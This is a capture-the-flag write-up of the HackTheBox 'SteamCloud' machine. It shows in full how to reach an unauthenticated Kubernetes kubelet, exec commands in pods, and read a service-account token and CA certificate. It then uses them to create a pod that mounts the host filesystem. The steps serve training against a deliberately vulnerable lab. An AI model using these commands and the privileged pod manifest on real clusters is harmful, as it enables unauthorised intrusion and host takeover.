---
layout: post
title: HTB SteamCloud Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/steamcloud/steamcloud.png
tags: [HTB]
---

# Notes
![SteamCloud](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/steamcloud/steamcloud.png)


| Name | SteamCloud |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 14 Feb 2022 |
| DIFFICULTY | Easy |

# Port Scan
IP: 10.10.11.133
```
nmap -p- --min-rate 10000 10.10.11.133

nmap -p 22,2379,2380,8443,10249,10250,10256 -sV -sC 10.10.11.133

22/tcp    open   ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                                                                                                                                                                                                                          
| ssh-hostkey:                                                                                                                                                                                                                                                                                                                                                                            
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)                                                                                                                                                                                                                                                                                                                            
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)                                                                                                                                                                                                                                                                                                                           
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open   ssl/etcd-client?                                                                                                                                                                                                                                                                                                                                                         
| tls-alpn:                                                                                                                                                                                                                                                                                                                                                                               
|_  h2                                                                                                                                                                                                                                                                                                                                                                                    
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                                                                                                                                                                                        
| ssl-cert: Subject: commonName=steamcloud                                                                                                                                                                                                                                                                                                                                                
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1                                                                                                                                                                                                                                                      
| Not valid before: 2022-03-10T02:50:12                                                                                                                                                                                                                                                                                                                                                   
|_Not valid after:  2023-03-10T02:50:12                                                                                                                                                                                                                                                                                                                                                   
2380/tcp  open   ssl/etcd-server?                                                                                                                                                                                                                                                                                                                                                         
| ssl-cert: Subject: commonName=steamcloud                                                                                                                                                                                                                                                                                                                                                
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1                                                                                                                                                                                                                                                      
| Not valid before: 2022-03-10T02:50:12                                                                                                                                                                                                                                                                                                                                                   
|_Not valid after:  2023-03-10T02:50:13                                                                                                                                                                                                                                                                                                                                                   
| tls-alpn:                                                                                                                                                                                                                                                                                                                                                                               
|_  h2                                                                                                                                                                                                                                                                                                                                                                                    
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                                                                                                                                                                                        
8443/tcp  open   ssl/https-alt                                                                                                                                                                                                                                                                                                                                                            
| fingerprint-strings:                                                                                                                                                                                                                                                                                                                                                                    
|   FourOhFourRequest:                                                                                                                                                                                                                                                                                                                                                                    
|     HTTP/1.0 403 Forbidden                                                                                                                                                                                                                                                                                                                                                              
|     Audit-Id: 294c3644-893c-4235-9374-2383bde0bcb4                                                                                                                                                                                                                                                                                                                                      
|     Cache-Control: no-cache, private                                                                                                                                                                                                                                                                                                                                                    
|     Content-Type: application/json                                                                                                                                                                                                                                                                                                                                                      
|     X-Content-Type-Options: nosniff                                                                                                                                                                                                                                                                                                                                                     
|     X-Kubernetes-Pf-Flowschema-Uid: cb3a526b-c0fd-4a69-a83e-9213ec171034                                                                                                                                                                                                                                                                                                                
|     X-Kubernetes-Pf-Prioritylevel-Uid: e078fbdc-3440-406f-b551-a1578dbd1cee                                                                                                                                                                                                                                                                                                             
|     Date: Thu, 10 Mar 2022 02:54:02 GMT                                                                                                                                                                                                                                                                                                                                                 
|     Content-Length: 212                                                                                                                                                                                                                                                                                                                                                                 
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}                                                                                                                                                                     
|   GetRequest:                                                                                                                                                                                                                                                                                                                                                                           
|     HTTP/1.0 403 Forbidden                                                                                                                                                                                                                                                                                                                                                              
|     Audit-Id: 768ad344-ae14-43a9-aa32-405cecc553f1                                                                                                                                                                                        
|     Cache-Control: no-cache, private                                                                                                                      
|     Content-Type: application/json                                                                                                                                                                                                        
|     X-Content-Type-Options: nosniff                                                                                                                                                                                                       
|     X-Kubernetes-Pf-Flowschema-Uid: cb3a526b-c0fd-4a69-a83e-9213ec171034    
|     X-Kubernetes-Pf-Prioritylevel-Uid: e078fbdc-3440-406f-b551-a1578dbd1cee 
|     Date: Thu, 10 Mar 2022 02:54:01 GMT                                     
|     Content-Length: 185                                                     
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}                                                                                    
|   HTTPOptions:                                                                                                                                            
|     HTTP/1.0 403 Forbidden                                                  
|     Audit-Id: e9d1fd08-578c-40f4-8c8b-7fcdbdcba7a9                          
|     Cache-Control: no-cache, private                                        
|     Content-Type: application/json                                                                                                                                                                                                        
|     X-Content-Type-Options: nosniff                                                                                                                                                                                                       
|     X-Kubernetes-Pf-Flowschema-Uid: cb3a526b-c0fd-4a69-a83e-9213ec171034                                                                                                                                                                  
|     X-Kubernetes-Pf-Prioritylevel-Uid: e078fbdc-3440-406f-b551-a1578dbd1cee                                                                                                                                                               
|     Date: Thu, 10 Mar 2022 02:54:02 GMT                                     
|     Content-Length: 189                                                     
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}                                                                                
|_http-title: Site doesn't have a title (application/json).                   
| tls-alpn:                                                                                                                                                                                                                                 
|   h2                                                                        
|_  http/1.1                                                                                                                                                                                                                                
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters      
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-03-09T02:50:11                                                                                                                                                                                                     
|_Not valid after:  2025-03-09T02:50:11                                                                                                                                                                                                     
|_ssl-date: TLS randomness does not represent time                                                                    
10249/tcp open   http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                                                                                                                 
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).                                                                                        
10250/tcp open   ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                                 
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).                                                                                                                                                                                                          
|_ssl-date: TLS randomness does not represent time                          
| ssl-cert: Subject: commonName=steamcloud@1646880615                                                                                                                                                                                       
| Subject Alternative Name: DNS:steamcloud                                    
| Not valid before: 2022-03-10T01:50:14                                                                               
|_Not valid after:  2023-03-10T01:50:14                                                                                                                                                                                                     
| tls-alpn:                                                                                                           
|   h2                                                                                                                
|_  http/1.1                                                                                                          
10256/tcp open   http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                                  
|_http-title: Site doesn't have a title (text/plain; charset=utf-8). 
```

### Port Scan analysis

From my scan, we have 7 open ports. 
- 22 SSH
- 2379 & 2380 - etcd 
- 8443 - Based on the TLS certificate this is minikube, a tool that lets you run Kubernetes locally
- 10249, 10250 & 10256 - https api 

# Enumerating SSH
Based on the SSH version being `OpenSSH 7.9p1 Debian 10+deb10u2` I think that this machine running Debain 10 Buster. I gave `Debian 10+deb10u2` a search on google and the first thing that came up was [https://packages.debian.org/buster/openssh-server](https://packages.debian.org/buster/openssh-server). From the URL and looking at the page this package is for Debain 10 Buster

# TCP 8443

From [HackTricks](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/pentesting-kubernetes-from-the-outside) this is the main Minikube API, so I'll start here

Nmap got a `Forbidden` error when trying to hit this page. I'll just quickly confirm this by using `curl` the `-k` will skip the TLS/SSL verification. The results show that we do not have access

```
┌──(root💀kali)-[~/htb]
└─# curl https://10.10.11.133:8443 -k
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {
    
  },
  "code": 403
}   
```

I also tried to use `ffuf` to see if there were any hidden directories that we could look at 

```
┌──(root💀kali)-[~/htb]                                                                                  
└─# ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u https://10.10.11.133:8443/FUZZ -c -fw 7,8,9
                                                                                                         
        /'___\  /'___\           /'___\                                                                  
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.133:8443/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 7
________________________________________________

version                 [Status: 200, Size: 263, Words: 28, Lines: 11]

```

Running `curl` against it shows some versions for Kubernetes
```
┌──(root💀kali)-[~/htb]
└─# curl https://10.10.11.133:8443/version -k                                                                                     
{
  "major": "1",
  "minor": "22",
  "gitVersion": "v1.22.3",
  "gitCommit": "c92036820499fedefec0f847e2054d824aea6cd1",
  "gitTreeState": "clean",
  "buildDate": "2021-10-27T18:35:25Z",
  "goVersion": "go1.16.9",
  "compiler": "gc",
  "platform": "linux/amd64"
}  
```

# HTTP 10249, 10250, 10256

### 10249

I was not able to get anything from this page, it returned a 404. I was however able to fuzz out a `/metrics` but nothing interesting was there

`ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.133:10249/FUZZ -c `

### 10250
I did the very same thing for port `10250` and this time I got a lot more output from `ffuf`

```
┌──(root💀kali)-[~/htb]
└─# ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u https://10.10.11.133:10250/FUZZ -c      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.133:10250/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

stats                   [Status: 301, Size: 42, Words: 3, Lines: 3]
logs                    [Status: 301, Size: 41, Words: 3, Lines: 3]
metrics                 [Status: 200, Size: 196356, Words: 2896, Lines: 1612]
pods                    [Status: 200, Size: 37847, Words: 1, Lines: 2]
:: Progress: [30000/30000] :: Job [1/1] :: 508 req/sec :: Duration: [0:00:59] :: Errors: 2 ::

```

`/metrics` was the same as above, nothing interesting. `/pods` on the other hand had all the pod information. 

```
┌──(root💀kali)-[~/htb]                                                     
curl https://10.10.11.133:10250/pods -k
{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"kube-proxy-2r8vg","generateName":"kube-proxy-","namespace":"kube-system","uid":"bce68dce-6b06-493f-b8b5-4347801220fd"
[...]
```

This output is super messy so I'll use `Kubeletctl ` to interact with it.

To install
`wget https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl`

Reading the man page I can run `kubeletctl pods -s 10.10.11.133` to connect to the server and list the pods. 
```
pods                     Get list of pods on the node
-s, --server string      Server address (format: x.x.x.x. For Example: 123.123.123.123)
  ```
  
We have access to all the pods!
  ```
  ┌──(root💀kali)-[~/htb]
└─# kubeletctl pods -s 10.10.11.133
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-proxy-2r8vg                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │                                                                                                                                
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ coredns-78fcd69978-7nw88           │ kube-system │ coredns                 │                                                                                                                                
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │               
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │               
│   │                                    │             │                         │                                                                                                                                
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘

  ```
  
  ## Command Execution
  Reading the documentation I found that there is a `exec` parameter that we can use to execute commands on pods! The syntax is `kubeletctl exec <command> -c <container> -p <pod> -n <namespace> [flags]`. After inputting everything my command is below and we see that we are root in the container. 
  
  ```
┌──(root💀kali)-[~/htb]
└─# kubeletctl exec "whoami" -p nginx -c nginx -n default -s 10.10.11.133                                                                                                                                     1 ⨯
root
  ```
  
  # Privilege Escalation
  My go-to site for when I need to learn how to hack something is [Hack Tricks](https://book.hacktricks.xyz/). They have a nice section on [Kubernetes Enumeration](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration) that I used for this box. 
  
Looking inside that first directory listed on the site, `/run/secrets/kubernetes.io/serviceaccount`, there are three files in that directory; ca.crt, namespace, and token. These two files will let us authenticate to the `kube-apiserver` that is running on port that we did not have access to previously. 

I will save the certificate to `ca.crt`
```
┌──(root💀kali)-[~/htb]
└─# kubeletctl exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx -n default -s 10.10.11.133 > ca.crt
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
kf2eZIBNMp0TFg==
-----END CERTIFICATE-----
```

I will print out the token and save it to an environment variable called `$token` to make the commander later on less messy
```
┌──(root💀kali)-[~/htb]
└─# kubeletctl exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx -n default -s 10.10.11.133 
eyJhbGciOiJSUzI1NiIsImtpZCI6IjhHbWw4UjFTRXRCRTd1NHRmNXpYN0gtck9BZ0NhVnVweVoweFhJeUx1RTgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc4NTA2OTk2LCJpYXQiOjE2NDY5NzA5OTYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjEwYjQ3YjBlLTc2YTMtNGIyNC05ZjRkLTc4NzUzMzU4NjZmMSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjY0ZTE4M2VhLTczYWMtNGQ5MC05NDgyLTI1ZGQ1YWVmZWJjOSJ9LCJ3YXJuYWZ0ZXIiOjE2NDY5NzQ2MDN9LCJuYmYiOjE2NDY5NzA5OTYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.EeKWx6TVZGkSrJANUMVh9OFLz_TwWiWSF8eV9eGnei6EWjvqU9EEbvoR2Xzx4rG3qYL_ZzfE7q_Umab-gTh2h-LtLlG4uR9TFtGsjVnh3RhIJw47Mh2hqUgeL3fpPwcWZXWtBco2M-_rjJGdcquzKxpA9KdP6bGZ757LbXYnK8p3bfh_s421kVnqZu09W_fvGpJwmeIG9maRAo3Ac3h7ueU2kjiVmB3A8ohxWadMInKcHqp06cnsU0QO535q2PxMf3T1Jttn52vHuv3HzV9yuqK8RjVLbTItrNPyTNuy12ur-2r3Y1YHd2AKsc9JlgXJql1xhetIln3eSWoYMee-Lg   
```

```export token="eyJhbGciOiJSUzI1NiIsImtpZCI6Ijh[snip]"```

Now we can use those credentials to run `cubectl` and interact with the pod!
```
┌──(root💀kali)-[~/htb/steamCloud]
└─# kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods         
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          12h
```

Next, we can use this to create a pod and mount part of the root file system to it much like "GoodGames." This will allow us to read any files from the host file system like `/root/root.txt`

To do this I'll create `pod.yaml`. This will mount `/` from the host system to `/tmp/` on the container.
```
apiVersion: v1 
kind: Pod
metadata:
  name: z0n
  namespace: default
spec:
  containers:
  - name: z0n
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /tmp
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

We will create our new container with this command 
`kubectl apply -f pod.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
`

And verify that it is running 
```
┌──(root💀kali)-[~/htb/steamCloud]
└─# kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods         
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          54s
z0n     1/1     Running   0          2s
```

Now we can access the root file system of the host
```
┌──(root💀kali)-[~/htb/steamCloud]
└─# kubeletctl exec "ls /tmp" -s 10.10.11.133 -p z0n -c z0n                                               
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
```

And get our root flag 

```
┌──(root💀kali)-[~/htb/steamCloud]
└─# kubeletctl exec "cat /tmp/root/root.txt" -s 10.10.11.133 -p z0n -c z0n                                                      
[snip]
```
